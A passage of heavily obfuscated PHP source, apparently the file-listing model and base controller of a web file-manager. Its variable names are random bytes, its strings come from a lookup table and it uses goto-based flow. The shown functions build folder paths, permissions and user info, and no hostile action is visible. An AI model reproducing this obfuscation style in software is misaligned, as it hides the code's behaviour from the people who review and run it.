$óı…‘İ–[$±›†¸»Ä[412]]; } foreach ($¶–©Ïò² as &$Ñ©íì¯¡) { $Ûˆ¤Øşæ = $Ñ©íì¯¡[$±›†¸»Ä[506]]; if (!$Ûˆ¤Øşæ || !is_array($¢Ä·õ¥[$Ûˆ¤Øşæ])) { continue; } $à“ì¿¬ = $¢Ä·õ¥[$Ûˆ¤Øşæ]; $à“ì¿¬[$±›†¸»Ä[76]] = $Ñ©íì¯¡[$±›†¸»Ä[76]]; $à“ì¿¬[$±›†¸»Ä[32]] = $Ñ©íì¯¡[$±›†¸»Ä[32]]; if (!isset(self::$cacheFileInfo[$±›†¸»Ä[512] . $Ûˆ¤Øşæ])) { self::$cacheFileInfo[$±›†¸»Ä[512] . $Ûˆ¤Øşæ] = array_merge(array(), $à“ì¿¬); } unset($¢Ä·õ¥[$Ûˆ¤Øşæ][$±›†¸»Ä[84]]); $·š©¼à = is_array($­îîƒ¹[$Ûˆ¤Øşæ]) ? $­îîƒ¹[$Ûˆ¤Øşæ] : array(); $Ñ©íì¯¡[$±›†¸»Ä[170]] = array_merge($·š©¼à, $¢Ä·õ¥[$Ûˆ¤Øşæ]); if (isset($Ñ©íì¯¡[$±›†¸»Ä[170]][$±›†¸»Ä[169]])) { $Ñ©íì¯¡[$±›†¸»Ä[169]] = json_decode($Ñ©íì¯¡[$±›†¸»Ä[170]][$±›†¸»Ä[169]], !0); unset($Ñ©íì¯¡[$±›†¸»Ä[170]][$±›†¸»Ä[169]]); } } unset($Ñ©íì¯¡); } protected function _listAppendSourceInfo(&$çØĞµ ¸, $¡÷Ê¤¦Ô) { $í¶™€÷É =& $_SERVER[”ú…±Ú¥]; $÷”Ô¥ıÚ = Model($í¶™€÷É[513])->listData(); $ö–¢³…å = Model($í¶™€÷É[463])->listData(); $³šâÊí = Model($í¶™€÷É[453])->listData(); $ø·„Èæ² = Model($í¶™€÷É[514])->listSimple(); $ï”§™Æ = array_to_keyvalue($÷”Ô¥ıÚ, $í¶™€÷É[437]); $•ØÙº² = array_to_keyvalue_group($ö–¢³…å, $í¶™€÷É[84], $í¶™€÷É[464]); $»Ûİ·’ = array_to_keyvalue($³šâÊí, $í¶™€÷É[84]); $á¸€÷ûÒ = array_to_keyvalue_group($ø·„Èæ², $í¶™€÷É[440]); foreach ($çØĞµ ¸ as &$á˜§¿«›) { $á˜§¿«›[$í¶™€÷É[87]] = array($í¶™€÷É[515] => 0, $í¶™€÷É[516] => 0, $í¶™€÷É[517] => 0); if (isset($»Ûİ·’[$á˜§¿«›[$í¶™€÷É[440]]])) { $á˜§¿«›[$í¶™€÷É[87]][$í¶™€÷É[518]] = 1; $á˜§¿«›[$í¶™€÷É[87]][$í¶™€÷É[519]] = $»Ûİ·’[$á˜§¿«›[$í¶™€÷É[440]]][$í¶™€÷É[32]]; } if ($•ØÙº² && $ï”§™Æ && isset($•ØÙº²[$á˜§¿«›[$í¶™€÷É[440]]])) { $á˜§¿«›[$í¶™€÷É[87]][$í¶™€÷É[520]] = array(); foreach ($•ØÙº²[$á˜§¿«›[$í¶™€÷É[440]]] as $ëöİúä¯) { $Éœô©Ö = $ï”§™Æ[$ëöİúä¯]; $á˜§¿«›[$í¶™€÷É[87]][$í¶™€÷É[520]][] = array($í¶™€÷É[521] => $Éœô©Ö[$í¶™€÷É[437]], $í¶™€÷É[458] => $Éœô©Ö[$í¶™€÷É[32]], $í¶™€÷É[522] => $Éœô©Ö[$í¶™€÷É[523]]); } } if ($á¸€÷ûÒ && isset($á¸€÷ûÒ[$á˜§¿«›[$í¶™€÷É[440]]])) { $á˜§¿«›[$í¶™€÷É[87]][$í¶™€÷É[524]] = array(); foreach ($á¸€÷ûÒ[$á˜§¿«›[$í¶™€÷É[440]]] as $¡”Ş”¥‹) { $×Õò§‹† = $í¶™€÷É[525]; if ($¡”Ş”¥‹[$í¶™€÷É[526]] == $í¶™€÷É[88]) { $×Õò§‹† .= $í¶™€÷É[527]; } $á˜§¿«›[$í¶™€÷É[87]][$í¶™€÷É[524]] = array_field_key($¡”Ş”¥‹, explode($í¶™€÷É[50], $×Õò§‹†)); } } } unset($á˜§¿«›); return $çØĞµ ¸; } protected function _listAppendChildren(&$œ¬ê—²™, $İúû—¼¤) { $œ³‚Í´› =& $_SERVER[”ú…±Ú¥]; $¯óˆ³¦Ô = array(); $Ô›Î½úÅ = array($œ³‚Í´›[217] => 0, $œ³‚Í´›[218] => 0); foreach ($œ¬ê—²™ as &$²ÇõÊéÃ) { if (!$²ÇõÊéÃ[$œ³‚Í´›[448]]) { continue; } $¯óˆ³¦Ô[] = $²ÇõÊéÃ[$œ³‚Í´›[440]]; } unset($²ÇõÊéÃ); if (!$¯óˆ³¦Ô) { return; } $™Ë±˜Š = array($œ³‚Í´›[470] => array($œ³‚Í´›[7], $¯óˆ³¦Ô), $œ³‚Í´›[469] => 0); $¿ãŞ¾’Ç = array($œ³‚Í´›[470], $œ³‚Í´›[448], $œ³‚Í´›[528] => $œ³‚Í´›[529]); $áî³šòØ = $this->field($¿ãŞ¾’Ç)->where($™Ë±˜Š)->group($œ³‚Í´›[530])->select(); $ÈëÕéúâ = array(); foreach ($áî³šòØ as $´ÖäğÚ) { $ÁŸ—Ë’ = $´ÖäğÚ[$œ³‚Í´›[470]]; $ÉÃ˜™ÃÏ = $´ÖäğÚ[$œ³‚Í´›[448]] == $œ³‚Í´›[88] ? $œ³‚Í´›[218] : $œ³‚Í´›[217]; if (!isset($ÈëÕéúâ[$ÁŸ—Ë’])) { $ÈëÕéúâ[$ÁŸ—Ë’] = array($œ³‚Í´›[217] => 0, $œ³‚Í´›[218] => 0); } $ÈëÕéúâ[$ÁŸ—Ë’][$ÉÃ˜™ÃÏ] += $´ÖäğÚ[$œ³‚Í´›[529]]; } foreach ($œ¬ê—²™ as &$²ÇõÊéÃ) { if (!$²ÇõÊéÃ[$œ³‚Í´›[448]]) { continue; } $©¼ôœ = is_array($ÈëÕéúâ[$²ÇõÊéÃ[$œ³‚Í´›[440]]]) ? $ÈëÕéúâ[$²ÇõÊéÃ[$œ³‚Í´›[440]]] : $Ô›Î½úÅ; $²ÇõÊéÃ[$œ³‚Í´›[218]] = $©¼ôœ[$œ³‚Í´›[218]]; $²ÇõÊéÃ[$œ³‚Í´›[217]] = $©¼ôœ[$œ³‚Í´›[217]]; unset($²ÇõÊéÃ[$œ³‚Í´›[450]]); } unset($²ÇõÊéÃ); } protected function _listAppendAuth(&$¿´Úü¸¾) { $¶¢Ä¶Ú­ =& $_SERVER[”ú…±Ú¥]; $ş¦ƒŠú = array(); foreach ($¿´Úü¸¾ as $µûêºúõ) { if ($µûêºúõ[$¶¢Ä¶Ú­[449]] == self::TYPE_GROUP) { $ş¦ƒŠú[] = $µûêºúõ[$¶¢Ä¶Ú­[440]]; } } if (!$ş¦ƒŠú) { return; } $„Ï½¸³÷ = array_to_keyvalue($¿´Úü¸¾, $¶¢Ä¶Ú­[440]); $âä²÷€º = Model($¶¢Ä¶Ú­[531])->getSourceList($ş¦ƒŠú, $„Ï½¸³÷); $ÑÀ±¦ü = $GLOBALS[$¶¢Ä¶Ú­[532]] == 1; foreach ($¿´Úü¸¾ as $¤ûÃÎÊµ => &$µûêºúõ) { $µûêºúõ[$¶¢Ä¶Ú­[451]] = $âä²÷€º[$µûêºúõ[$¶¢Ä¶Ú­[440]]]; if (!$µûêºúõ[$¶¢Ä¶Ú­[451]] && $µûêºúõ[$¶¢Ä¶Ú­[449]] == self::TYPE_GROUP) { $µûêºúõ[$¶¢Ä¶Ú­[451]] = Action($¶¢Ä¶Ú­[533])->pathGroupAuthMake($µûêºúõ[$¶¢Ä¶Ú­[534]]); if (!$µûêºúõ[$¶¢Ä¶Ú­[451]] && !$ÑÀ±¦ü) { $µûêºúõ[$¶¢Ä¶Ú­[213]] = !1; $µûêºúõ[$¶¢Ä¶Ú­[212]] = !1; } } if ($µûêºúõ[$¶¢Ä¶Ú­[451]]) { $µûêºúõ[$¶¢Ä¶Ú­[213]] = AuthModel::authCheckEdit($µûêºúõ[$¶¢Ä¶Ú­[451]][$¶¢Ä¶Ú­[452]]); $µûêºúõ[$¶¢Ä¶Ú­[212]] = AuthModel::authCheckView($µûêºúõ[$¶¢Ä¶Ú­[451]][$¶¢Ä¶Ú­[452]]); } $this->groupPathDisplay($µûêºúõ); } unset($µûêºúõ); } public function _listAppendAuthSecret(&$²©Ö´ê¿) { $§Œ€©Øğ =& $_SERVER[”ú…±Ú¥]; if (Model($§Œ€©Øğ[473])->get($§Œ€©Øğ[535]) != $§Œ€©Øğ[88]) { return; } static $èÂå‡¿ƒ = false; if (!$èÂå‡¿ƒ) { $ğĞíà›î = Model($§Œ€©Øğ[536]); $¯©ŞÕáê = Model($§Œ€©Øğ[537]); $èÂå‡¿ƒ = $¯©ŞÕáê->listData(); $èÂå‡¿ƒ = array_to_keyvalue($èÂå‡¿ƒ, $§Œ€©Øğ[440]); $Ÿ’‡÷İÚ = json_decode(Model($§Œ€©Øğ[473])->get($§Œ€©Øğ[538]), !0); $Ÿ’‡÷İÚ = array_to_keyvalue($Ÿ’‡÷İÚ, $§Œ€©Øğ[437]); foreach ($èÂå‡¿ƒ as $áŒ“ïµ™ => $ª‹Üôã¨) { $ãæèºµ‹ = $Ÿ’‡÷İÚ[$ª‹Üôã¨[$§Œ€©Øğ[539]]]; if (!$ãæèºµ‹) { $¯©ŞÕáê->remove($ª‹Üôã¨[$§Œ€©Øğ[437]]); unset($èÂå‡¿ƒ[$áŒ“ïµ™]); continue; } $½õûì = $ğĞíà›î->listData($ãæèºµ‹[$§Œ€©Øğ[451]]); if (!$½õûì) { $¯©ŞÕáê->remove($ª‹Üôã¨[$§Œ€©Øğ[437]]); unset($èÂå‡¿ƒ[$áŒ“ïµ™]); continue; } $ª‹Üôã¨[$§Œ€©Øğ[451]] = $½õûì; $ª‹Üôã¨[$§Œ€©Øğ[540]] = $ãæèºµ‹; $ª‹Üôã¨[$§Œ€©Øğ[541]] = Model($§Œ€©Øğ[542])->getInfoSimpleOuter($ª‹Üôã¨[$§Œ€©Øğ[492]]); $èÂå‡¿ƒ[$áŒ“ïµ™] = $ª‹Üôã¨; } } $ ÍŠ°¢¯ = USER_ID; $üìü¹ß‹ = array(); $Ää“²ÊÏ = $this->_listAppendPath($üìü¹ß‹, !0); foreach ($²©Ö´ê¿ as $áŒ“ïµ™ => &$ª‹Üôã¨) { if (!is_array($ª‹Üôã¨[$§Œ€©Øğ[451]])) { continue; } if ($ª‹Üôã¨[$§Œ€©Øğ[449]] != $§Œ€©Øğ[543]) { continue; } if (isset($èÂå‡¿ƒ[$ª‹Üôã¨[$§Œ€©Øğ[440]]])) { $åÂ½í = $èÂå‡¿ƒ[$ª‹Üôã¨[$§Œ€©Øğ[440]]]; if (!is_array($ª‹Üôã¨[$§Œ€©Øğ[504]])) { $ª‹Üôã¨[$§Œ€©Øğ[504]] = array(); } $ª‹Üôã¨[$§Œ€©Øğ[504]][$§Œ€©Øğ[544]] = $åÂ½í[$§Œ€©Øğ[539]]; $ª‹Üôã¨[$§Œ€©Øğ[451]][$§Œ€©Øğ[545]] = $åÂ½í; $ª‹Üôã¨[$§Œ€©Øğ[451]][$§Œ€©Øğ[546]] = $ª‹Üôã¨[$§Œ€©Øğ[547]]; $ª‹Üôã¨[$§Œ€©Øğ[451]][$§Œ€©Øğ[548]] = $§Œ€©Øğ[88]; if ($åÂ½í[$§Œ€©Øğ[492]] != $ ÍŠ°¢¯) { $ª‹Üôã¨[$§Œ€©Øğ[451]][$§Œ€©Øğ[452]] = $ª‹Üôã¨[$§Œ€©Øğ[451]][$§Œ€©Øğ[452]] & $åÂ½í[$§Œ€©Øğ[451]][$§Œ€©Øğ[451]]; } continue; } $Éä¹¥‹Ì = $this->parentLevelArray($ª‹Üôã¨[$§Œ€©Øğ[549]]); $õ½Ø¬§‹ = array_reverse($Éä¹¥‹Ì); foreach ($õ½Ø¬§‹ as $œ­˜àñÅ => $«„ç½–) { if (!isset($èÂå‡¿ƒ[$«„ç½–])) { continue; } $åÂ½í = $èÂå‡¿ƒ[$«„ç½–]; $ª‹Üôã¨[$§Œ€©Øğ[451]][$§Œ€©Øğ[545]] = $åÂ½í; if ($åÂ½í[$§Œ€©Øğ[492]] != $ ÍŠ°¢¯) { $ª‹Üôã¨[$§Œ€©Øğ[451]][$§Œ€©Øğ[452]] = $ª‹Üôã¨[$§Œ€©Øğ[451]][$§Œ€©Øğ[452]] & $åÂ½í[$§Œ€©Øğ[451]][$§Œ€©Øğ[451]]; } $§ãÏùõ = $§Œ€©Øğ[12]; $ó¼™Û¥ = count($Éä¹¥‹Ì) - $œ­˜àñÅ; for ($É’İŞÕ£ = 0; $É’İŞÕ£ < $ó¼™Û¥; $É’İŞÕ£++) { if (!isset($Ää“²ÊÏ[$Éä¹¥‹Ì[$É’İŞÕ£]])) { $§ãÏùõ = $§Œ€©Øğ[12]; break; } $§ãÏùõ = $§ãÏùõ . rtrim($Ää“²ÊÏ[$Éä¹¥‹Ì[$É’İŞÕ£]], $§Œ€©Øğ[8]) . $§Œ€©Øğ[8]; } $ª‹Üôã¨[$§Œ€©Øğ[451]][$§Œ€©Øğ[546]] = rtrim($§ãÏùõ, $§Œ€©Øğ[8]) . $§Œ€©Øğ[8]; break; } } unset($ª‹Üôã¨); } public function groupPathDisplay(&$ñòË…æ) { $Û‡»Ìíš =& $_SERVER[”ú…±Ú¥]; if ($ñòË…æ[$Û‡»Ìíš[449]] != self::TYPE_GROUP) { return; } $­¹×„Û— = Model($Û‡»Ìíš[550])->getInfo($ñòË…æ[$Û‡»Ìíš[534]]); $µ£û¬‚ö = $this->parentLevelArray($­¹×„Û—[$Û‡»Ìíš[549]]); $×“ş¼±½ = $Û‡»Ìíš[12]; foreach ($µ£û¬‚ö as $Š¿ù«Á‰) { $¢Ú¡ ÙÇ = Model($Û‡»Ìíš[550])->getInfo($Š¿ù«Á‰); $×“ş¼±½ .= $¢Ú¡ ÙÇ[$Û‡»Ìíš[87]][$Û‡»Ìíš[440]] . $Û‡»Ìíš[50]; } $ñòË…æ[$Û‡»Ìíš[551]] = $­¹×„Û—[$Û‡»Ìíš[470]]; $ñòË…æ[$Û‡»Ìíš[552]] = $­¹×„Û—[$Û‡»Ìíš[549]]; $ñòË…æ[$Û‡»Ìíš[553]] = $­¹×„Û—[$Û‡»Ìíš[554]]; $ñòË…æ[$Û‡»Ìíš[555]] = $×“ş¼±½ . $­¹×„Û—[$Û‡»Ìíš[87]][$Û‡»Ìíš[440]]; } protected function _listAppendPath(&$ÅÏöÀú‡, $†’¨ïˆ = false) { $ğœğ†¢û =& $_SERVER[”ú…±Ú¥]; static $¥¹Û…€ù = array(); $ƒ›À²“û = array(); $’ÈáÓş¬ = array(); if ($†’¨ïˆ) { return $¥¹Û…€ù; } foreach ($ÅÏöÀú‡ as &$‡‹ı û÷) { $î•ïÈ±² = $‡‹ı û÷[$ğœğ†¢û[440]]; if ($‡‹ı û÷[$ğœğ†¢û[448]] == $ğœğ†¢û[88] && $‡‹ı û÷[$ğœğ†¢û[470]] != 0) { $¥¹Û…€ù[$î•ïÈ±²] = $‡‹ı û÷[$ğœğ†¢û[32]]; } if ($‡‹ı û÷[$ğœğ†¢û[448]] == $ğœğ†¢û[88] && $‡‹ı û÷[$ğœğ†¢û[470]] == 0 && !isset($¥¹Û…€ù[$î•ïÈ±²])) { $¥¹Û…€ù[$î•ïÈ±²] = $this->_listAppendPathRoot($‡‹ı û÷, array()); } if (isset($’ÈáÓş¬[$‡‹ı û÷[$ğœğ†¢û[549]]])) { continue; } $’ÈáÓş¬[$‡‹ı û÷[$ğœğ†¢û[549]]] = !0; $ãÂœ¬‚è = $this->parentLevelArray($‡‹ı û÷[$ğœğ†¢û[549]]); foreach ($ãÂœ¬‚è as $ÀÓØŒñÚ => $ƒ–Ê‡Ëò) { if (isset($¥¹Û…€ù[$ƒ–Ê‡Ëò])) { continue; } if ($ÀÓØŒñÚ == 0) { $¥¹Û…€ù[$ƒ–Ê‡Ëò] = $this->_listAppendPathRoot($‡‹ı û÷, $ãÂœ¬‚è); } if ($ÀÓØŒñÚ != 0) { $ƒ›À²“û[] = $ƒ–Ê‡Ëò; } } } unset($‡‹ı û÷); $ƒ›À²“û = array_unique($ƒ›À²“û); if (count($ƒ›À²“û) > 0) { $Ë™ÇÅæ = array($ğœğ†¢û[455] => array($ğœğ†¢û[456], $ƒ›À²“û)); if (count($ƒ›À²“û) == 1) { $ºš³¥»„ = $this->sourceInfo($ƒ›À²“û[0]); $à‘„Ãè¡ = is_array($ºš³¥»„) ? array($ºš³¥»„) : !1; } else { $à‘„Ãè¡ = $this->field($ğœğ†¢û[556])->where($Ë™ÇÅæ)->select(); } if (!$à‘„Ãè¡) { $à‘„Ãè¡ = array(); } foreach ($à‘„Ãè¡ as $•›‘–æ‰) { $¥¹Û…€ù[$•›‘–æ‰[$ğœğ†¢û[440]]] = $•›‘–æ‰[$ğœğ†¢û[32]]; } } $šŸ²™Ç¨ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ü€†òú = array(); foreach ($ÅÏöÀú‡ as &$‡‹ı û÷) { $ş…†×Ü = $‡‹ı û÷[$ğœğ†¢û[549]]; $À ½Ë¢£ = $ğœğ†¢û[12]; if (isset($ü€†òú[$ş…†×Ü])) { $À ½Ë¢£ = $ü€†òú[$ş…†×Ü]; } else { $ãÂœ¬‚è = $this->parentLevelArray($‡‹ı û÷[$ğœğ†¢û[549]]); foreach ($ãÂœ¬‚è as $ÀÓØŒñÚ => $ƒ–Ê‡Ëò) { if (isset($¥¹Û…€ù[$ƒ–Ê‡Ëò])) { $À ½Ë¢£ .= $¥¹Û…€ù[$ƒ–Ê‡Ëò] . $ğœğ†¢û[8]; } } $ü€†òú[$ş…†×Ü] = $À ½Ë¢£; } $À ½Ë¢£ .= $‡‹ı û÷[$ğœğ†¢û[32]]; if ($‡‹ı û÷[$ğœğ†¢û[448]] == $ğœğ†¢û[88]) { $À ½Ë¢£ .= $ğœğ†¢û[8]; } $‡‹ı û÷[$ğœğ†¢û[547]] = str_replace($ğœğ†¢û[557], $ğœğ†¢û[8], $À ½Ë¢£); if ($‡‹ı û÷[$ğœğ†¢û[470]] == $ğœğ†¢û[208]) { $‡‹ı û÷[$ğœğ†¢û[32]] = trim($¥¹Û…€ù[$‡‹ı û÷[$ğœğ†¢û[440]]], $ğœğ†¢û[8]); $‡‹ı û÷[$ğœğ†¢û[547]] = $‡‹ı û÷[$ğœğ†¢û[32]] . $ğœğ†¢û[8]; } if (intval($‡‹ı û÷[$ğœğ†¢û[449]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($‡‹ı û÷, $ãÂœ¬‚è, $šŸ²™Ç¨); } } unset($‡‹ı û÷); return $ÅÏöÀú‡; } private function _listAppendPathRecycle(&$ÑÚËÊ†ˆ, $¸¿ìøæ¡, $ ¥ÌÏÊ”) { $õÙˆõ€ƒ =& $_SERVER[”ú…±Ú¥]; if (!in_array($ ¥ÌÏÊ”, $¸¿ìøæ¡) && $ÑÚËÊ†ˆ[$õÙˆõ€ƒ[440]] != $ ¥ÌÏÊ”) { return; } $Ä‚Ûš»Ÿ = explode($õÙˆõ€ƒ[8], trim($ÑÚËÊ†ˆ[$õÙˆõ€ƒ[547]], $õÙˆõ€ƒ[8])); $ã“¸ß  = implode($õÙˆõ€ƒ[8], array_slice($Ä‚Ûš»Ÿ, 2)); $ÑÚËÊ†ˆ[$õÙˆõ€ƒ[547]] = $õÙˆõ€ƒ[8] . LNG($õÙˆõ€ƒ[558]) . $õÙˆõ€ƒ[8] . ltrim($ã“¸ß , $õÙˆõ€ƒ[8]); $ÑÚËÊ†ˆ[$õÙˆõ€ƒ[549]] = $õÙˆõ€ƒ[559] . implode($õÙˆõ€ƒ[50], array_slice($¸¿ìøæ¡, 1)) . $õÙˆõ€ƒ[50]; if ($ÑÚËÊ†ˆ[$õÙˆõ€ƒ[440]] == $ ¥ÌÏÊ”) { $ÑÚËÊ†ˆ[$õÙˆõ€ƒ[549]] = $õÙˆõ€ƒ[559]; $ÑÚËÊ†ˆ[$õÙˆõ€ƒ[470]] = $õÙˆõ€ƒ[208]; $ÑÚËÊ†ˆ[$õÙˆõ€ƒ[32]] = LNG($õÙˆõ€ƒ[558]); } $ÑÚËÊ†ˆ[$õÙˆõ€ƒ[560]] = $õÙˆõ€ƒ[561]; } protected function _listAppendPathRoot(&$æŠŞÀ€“, $„Ä©Æ·à) { $Ê¢Ë†ï” =& $_SERVER[”ú…±Ú¥]; static $ëŸÌ¸Ò¿ = false; $öê‘×¢» = $Ê¢Ë†ï”[12]; if ($æŠŞÀ€“[$Ê¢Ë†ï”[449]] == self::TYPE_USER) { if ($æŠŞÀ€“[$Ê¢Ë†ï”[534]] == USER_ID) { $öê‘×¢» = LNG($Ê¢Ë†ï”[562]); if ($ëŸÌ¸Ò¿ === !1) { $€ìÎ®¯ş = Model($Ê¢Ë†ï”[563])->getInfoFull(USER_ID); $ëŸÌ¸Ò¿ = _get($€ìÎ®¯ş, $Ê¢Ë†ï”[564], $Ê¢Ë†ï”[12]); } if ($„Ä©Æ·à && $„Ä©Æ·à[0] == $ëŸÌ¸Ò¿ || !$„Ä©Æ·à && $æŠŞÀ€“[$Ê¢Ë†ï”[440]] == $ëŸÌ¸Ò¿) { $öê‘×¢» = LNG($Ê¢Ë†ï”[565]); $æŠŞÀ€“[$Ê¢Ë†ï”[566]] = $Ê¢Ë†ï”[567]; } if (!$„Ä©Æ·à) { $æŠŞÀ€“[$Ê¢Ë†ï”[32]] = $öê‘×¢»; } } else { $¦ÇâÂûò = Model($Ê¢Ë†ï”[542])->getInfoSimple($æŠŞÀ€“[$Ê¢Ë†ï”[534]]); $öê‘×¢» = LNG($Ê¢Ë†ï”[568]) . $Ê¢Ë†ï”[162] . $¦ÇâÂûò[$Ê¢Ë†ï”[32]] . $Ê¢Ë†ï”[164]; $æŠŞÀ€“[$Ê¢Ë†ï”[569]] = array($Ê¢Ë†ï”[32] => $¦ÇâÂûò[$Ê¢Ë†ï”[32]], $Ê¢Ë†ï”[570] => $¦ÇâÂûò[$Ê¢Ë†ï”[570]], $Ê¢Ë†ï”[571] => $¦ÇâÂûò[$Ê¢Ë†ï”[571]]); } } else { if ($æŠŞÀ€“[$Ê¢Ë†ï”[449]] == self::TYPE_GROUP) { $¦ÇâÂûò = Model($Ê¢Ë†ï”[550])->getInfoSimple($æŠŞÀ€“[$Ê¢Ë†ï”[534]]); $öê‘×¢» = $¦ÇâÂûò[$Ê¢Ë†ï”[32]]; } else { if ($æŠŞÀ€“[$Ê¢Ë†ï”[449]] == self::TYPE_SYSTEM) { $öê‘×¢» = $Ê¢Ë†ï”[572]; } } } $öê‘×¢» = $öê‘×¢» ? $Ê¢Ë†ï”[8] . $öê‘×¢» . $Ê¢Ë†ï”[8] : $Ê¢Ë†ï”[8]; return $öê‘×¢»; } protected function _listAppendUser(&$ùõïÆ™¢) { $Ó¶œÔ¢Ş =& $_SERVER[”ú…±Ú¥]; $÷°ê´„ = array_to_keyvalue($ùõïÆ™¢, $Ó¶œÔ¢Ş[12], $Ó¶œÔ¢Ş[492]); $Ñ²³¼™¬ = array_to_keyvalue($ùõïÆ™¢, $Ó¶œÔ¢Ş[12], $Ó¶œÔ¢Ş[494]); $«ã ÚË = array_merge($÷°ê´„, $Ñ²³¼™¬); $ü–Ïô¼ = Model($Ó¶œÔ¢Ş[563])->userListInfo($«ã ÚË); foreach ($ùõïÆ™¢ as &$åë¨ø¹¹) { $òä‚Šï‚ = $åë¨ø¹¹[$Ó¶œÔ¢Ş[492]]; $åë¨ø¹¹[$Ó¶œÔ¢Ş[492]] = $ü–Ïô¼[$òä‚Šï‚] ? $ü–Ïô¼[$òä‚Šï‚] : !1; $òä‚Šï‚ = $åë¨ø¹¹[$Ó¶œÔ¢Ş[494]]; $åë¨ø¹¹[$Ó¶œÔ¢Ş[494]] = $ü–Ïô¼[$òä‚Šï‚] ? $ü–Ïô¼[$òä‚Šï‚] : !1; if (isset($åë¨ø¹¹[$Ó¶œÔ¢Ş[504]]) && $åë¨ø¹¹[$Ó¶œÔ¢Ş[504]][$Ó¶œÔ¢Ş[573]]) { $¡µ–Ñı† = $GLOBALS[$Ó¶œÔ¢Ş[6]][$Ó¶œÔ¢Ş[89]][$Ó¶œÔ¢Ş[574]]; if ($åë¨ø¹¹[$Ó¶œÔ¢Ş[504]][$Ó¶œÔ¢Ş[575]] <= time() - $¡µ–Ñı†) { $this->metaSet($åë¨ø¹¹[$Ó¶œÔ¢Ş[440]], $Ó¶œÔ¢Ş[573], null); $this->metaSet($åë¨ø¹¹[$Ó¶œÔ¢Ş[440]], $Ó¶œÔ¢Ş[575], null); unset($åë¨ø¹¹[$Ó¶œÔ¢Ş[504]][$Ó¶œÔ¢Ş[573]]); continue; } $…°ù§×‹ = $åë¨ø¹¹[$Ó¶œÔ¢Ş[504]][$Ó¶œÔ¢Ş[573]]; $åë¨ø¹¹[$Ó¶œÔ¢Ş[504]][$Ó¶œÔ¢Ş[576]] = Model($Ó¶œÔ¢Ş[563])->getInfoSimpleOuter($…°ù§×‹); } } unset($åë¨ø¹¹); } public function parentLevelArray($”Ûªİõı) { $•àã¡´À =& $_SERVER[”ú…±Ú¥]; $”Ûªİõı = explode($•àã¡´À[50], trim($”Ûªİõı, $•àã¡´À[50])); return array_remove_value($”Ûªİõı, $•àã¡´À[208]); } public function listAll($Éò×ÒÉ) { $—íºë¨ =& $_SERVER[”ú…±Ú¥]; $ÁÓŸú‡û = $this->sourceInfo($Éò×ÒÉ); $©ŸÎ¶‹ß = array($—íºë¨[577] => array($—íºë¨[578], $ÁÓŸú‡û[$—íºë¨[549]] . $Éò×ÒÉ . $—íºë¨[579]), $—íºë¨[580] => 0); $ú§ÒˆÂñ = $—íºë¨[581]; $Ø™ä¤ÈÉ = "\x4c\105\106\124\40\112\117\x49\116\40{$this->tablePrefix}\x69\157\x5f\x66\x69\154\145\40\146\x69\154\x65\x20\157\x6e\x20\x73\x6f\165\162\143\145\x2e\146\151\x6c\x65\111\x44\40\75\x20\x66\151\x6c\x65\56\x66\151\154\x65\x49\x44"; $†Æ­˜Â = $this->alias($—íºë¨[484])->field($ú§ÒˆÂñ)->where($©ŸÎ¶‹ß)->join($Ø™ä¤ÈÉ)->select(); $this->_listAppendAuth($†Æ­˜Â); $this->_listAppendUser($†Æ­˜Â); $this->_listAppendPath($†Æ­˜Â); $†Æ­˜Â = array_to_keyvalue($†Æ­˜Â, $—íºë¨[440]); $–ÖÉ ‰ò = "\x2f{$ÁÓŸú‡û[$—íºë¨[32]]}\57"; $–ÖÉ ‰ò = $–ÖÉ ‰ò == $—íºë¨[557] ? $—íºë¨[8] : $–ÖÉ ‰ò; $÷ÕÛù«‰ = array(); foreach ($†Æ­˜Â as $Ù°²»¾á => $€Çûùãş) { $Â°Í¦à½ = $this->parentLevelArray($€Çûùãş[$—íºë¨[549]]); array_shift($Â°Í¦à½); $Ğ›øˆĞ = $–ÖÉ ‰ò; for ($Ü×² „ó = 0; $Ü×² „ó < count($Â°Í¦à½); $Ü×² „ó++) { $Ğ›øˆĞ .= $†Æ­˜Â[$Â°Í¦à½[$Ü×² „ó]][$—íºë¨[32]] . $—íºë¨[8]; } $Ğ›øˆĞ .= $€Çûùãş[$—íºë¨[32]]; if ($€Çûùãş[$—íºë¨[448]]) { $Ğ›øˆĞ .= $—íºë¨[8]; } $°ƒÑ¥­î = array($—íºë¨[459] => str_replace($—íºë¨[557], $—íºë¨[8], str_replace($—íºë¨[557], $—íºë¨[8], str_replace($—íºë¨[557], $—íºë¨[8], $Ğ›øˆĞ))), $—íºë¨[582] => intval($€Çûùãş[$—íºë¨[448]]), $—íºë¨[583] => intval($€Çûùãş[$—íºë¨[76]]), $—íºë¨[85] => intval($€Çûùãş[$—íºë¨[85]]), $—íºë¨[87] => $this->pathInfoFilter($€Çûùãş)); if (!$°ƒÑ¥­î[$—íºë¨[448]]) { $°ƒÑ¥­î[$—íºë¨[506]] = $€Çûùãş[$—íºë¨[506]]; } $÷ÕÛù«‰[] = $°ƒÑ¥­î; } $÷ÕÛù«‰ = array_sort_by($÷ÕÛù«‰, $—íºë¨[84]); return $÷ÕÛù«‰; } } goto B¿»Ÿô–ãŒ; dÚ…­ß¿¡: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¥ıÌ¶åô =& $_SERVER[”ú…±Ú¥]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¥ıÌ¶åô[6]] =& $config; $this->values[$¥ıÌ¶åô[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¥ıÌ¶åô[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Šù÷¤ó˜) { if (1 === func_num_args()) { $this->{$Šù÷¤ó˜} = new $Šù÷¤ó˜(); } else { $ Õˆ—’Ù = new ReflectionClass($Šù÷¤ó˜); $îò«¥ò = func_get_args(); array_shift($îò«¥ò); $this->{$Šù÷¤ó˜} = $ Õˆ—’Ù->newInstanceArgs($îò«¥ò); } return $this->{$Šù÷¤ó˜}; } public function routeBind($¸·ÇÓ¿é, $Š‚Ü÷ŒÙ, $ÖñÊ‡ê  = 3) { $şŞèğÁ =& $_SERVER[”ú…±Ú¥]; $¤Æôâ = $this->in[$şŞèğÁ[9]]; $¸·ÇÓ¿é = str_replace($şŞèğÁ[10], $şŞèğÁ[11], trim(trim($¸·ÇÓ¿é, $şŞèğÁ[8]), $şŞèğÁ[12])); if (!$¸·ÇÓ¿é || count($¤Æôâ) <= $ÖñÊ‡ê ) { return !1; } $÷„Ö†Ö = !0; 